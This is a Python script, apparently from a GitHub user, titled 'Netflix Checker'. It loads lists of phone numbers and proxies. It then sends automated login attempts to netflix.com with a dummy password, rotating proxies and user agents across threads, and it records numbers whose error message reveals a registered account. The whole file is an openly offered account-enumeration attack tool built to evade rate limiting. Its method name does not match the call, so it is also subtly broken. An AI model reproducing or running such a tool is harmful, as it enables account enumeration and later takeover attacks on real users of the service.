# llx404 on github
import os, requests, easygui, time, random, threading, ctypes
from colorama import Fore
from fake_useragent import UserAgent as ua
from bs4 import BeautifulSoup as Soup


def center(var:str, space:int=None): 
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

class main:
    def __init__(self):
        self.proxies = []
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.cpm = 0  
        self.retries = 0   
        self.lock = threading.Lock()
            
    def ascci(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Netflix Checker] - By llx404') 
        text = '''    
                  ███▄    █ ▓█████▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀
                  ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ 
                  ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ 
                  ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ 
                  ▒██░   ▓██░░▒████▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄
                  ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒
                  ░ ░░   ░ ▒░ ░ ░  ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░
                  ░   ░ ░    ░    ░      ░         ░  ░░ ░   ░   ░        ░ ░░ ░ 

'''        
        faded = ''
        red = 40
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))
        print(center(f'{Fore.LIGHTBLUE_EX}\ngithub.com/llx404\n{Fore.RESET}'))
    
    def cpmCounter(self):
        while True:
            old = self.hits
            time.sleep(4)
            new = self.hits
            self.cpm = (new-old) * 15

    def updateTitle(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            ctypes.windll.kernel32.SetConsoleTitleW(f'[llx404 on git] - Hits: {self.hits} | Bad: {self.bad} | Retries: {self.retries} | CPM: {self.cpm} | Threads: {threading.active_count() - 2} | Time elapsed: {elapsed}')
            time.sleep(0.4)

    def getProxies(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Path to proxy file> ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Select proxy', multiple= False)
            open(path, "r", encoding="utf-8") 
            choice = int(input(f'[{Fore.LIGHTBLUE_EX}?{Fore.RESET}] Proxy type [{Fore.LIGHTBLUE_EX}0{Fore.RESET}]HTTPS/[{Fore.LIGHTBLUE_EX}1{Fore.RESET}]SOCKS4/[{Fore.LIGHTBLUE_EX}2{Fore.RESET}]SOCKS5> '))
            if choice == 0:
                proxytype = 'https'                          
            elif choice == 1:
                proxytype = 'socks4'
            elif choice == 2:
                proxytype = 'socks5'
            else:
                print(f'[{Fore.RED}!{Fore.RESET}] Please enter a valid choice such as 0, 1 or 2!')
                os.system('pause >nul')
                quit()
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                    ip = l.split(":")[0]
                    port = l.split(":")[1]
                    self.proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})
        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer')
            os.system('pause >nul')
            quit()
       
        except Exception as e:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open proxyfile')
            os.system('pause >nul')
            quit()

    def getNumbers(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Path to numbers> ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Select numbers', multiple= False)
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                     self.combos.append(l.replace('\n', ''))
        except:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open numbersfile')
            os.system('pause >nul')
            quit()
        
    def ckeck(self, number):
        try:     
            client = requests.Session()
            login = client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies))
            soup = Soup(login.text,'html.parser')
            loginForm = soup.find('form')
            authURL = loginForm.find('input', {'name': 'authURL'}).get('value')   
            
            headers = {"user-agent": ua().random,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br", "referer": "https://www.netflix.com/login", "content-type": "application/x-www-form-urlencoded","cookie":""}
            data = {"userLoginId:": number, "password": "llx4040ongithub", "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", "authURL": authURL, "nextPage": "https://www.netflix.com/browse","countryCode": "+1","countryIsoCode": "US"}  
            
            request = client.post("https://www.netflix.com/login",headers =headers, data =data ,proxies =random.choice(self.proxies))
            # cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies)).cookies.get("flwssn"))
            
            if 'Incorrect password. Please try again or you can reset your password.' in request.text:
                self.lock.acquire()
                print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}HIT{Fore.RESET} | {number}')
                self.hits += 1
                with open('valid.txt', 'a', encoding='utf-8') as fp:
                    fp.writelines(f'{number}\n')   
                self.lock.release()
            else:     
                self.lock.acquire()
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}BAD{Fore.RESET} | {number} ')
                self.bad += 1
                self.lock.release()
        except:
            self.lock.acquire()
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN')
            self.retries += 1
            self.lock.release()
    
    def all(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            combination = combos[self.check[thread_id]]
            self.checker(combination)
            self.check[thread_id] += 1 

    def go(self):
        self.ascci()
        self.getProxies()
        self.getNumbers()
        try:
            self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> '))
        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer')
            os.system('pause >nul')
            quit()
               
        self.ascci()
        self.start = time.time()
        threading.Thread(target =self.cpmCounter, daemon =True).start()
        threading.Thread(target =self.updateTitle ,daemon =True).start()
        
        threads = []
        self.check = [0 for i in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.all, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
        os.system('pause>nul')
        
n = main()
n.go()
